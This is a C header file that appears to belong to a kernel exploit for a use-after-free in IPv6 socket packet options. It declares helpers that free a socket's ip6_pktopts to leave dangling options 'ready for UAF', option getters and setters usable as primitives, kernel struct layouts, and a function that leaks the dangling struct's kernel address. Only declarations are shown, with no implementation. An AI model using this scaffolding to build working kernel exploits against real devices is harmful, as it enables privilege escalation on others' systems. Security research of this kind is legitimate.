#include <sys/socket.h>
#include <netinet/in.h>

int get_socket();

// utilities to manipulate sockets
int set_minmtu(int sock, int *minmtu);

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock);

// return a socket ready for UAF
int get_socket_with_dangling_options();

int get_minmtu(int sock, int *minmtu);

int get_prefertempaddr(int sock, int *prefertempaddr);

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo);

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo);

/* int; prefer temporary addresses as the source address. */
#define IPV6_PREFER_TEMPADDR    63

#define IPV6_USE_MIN_MTU        42 /* bool; send packets at the minimum MTU */

#define IPV6_PKTINFO 46

struct route_in6 {
    struct rtentry *ro_rt;
    struct llentry *ro_lle;
    struct ifaddr *ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr *ip6po_rhi_rthdr; /* Routing header */
    struct route_in6 ip6po_rhi_route; /* Route to the 1st hop */
};

struct ip6po_nhinfo {
    struct sockaddr *ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route; /* Route to the nexthop */
};

struct ip6_pktopts {
    struct mbuf *ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo *ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh *ip6po_hbh;
    struct ip6_dest *ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest *ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

uint64_t get_dangling_ip6_pktopts_kaddr(int socket_fd);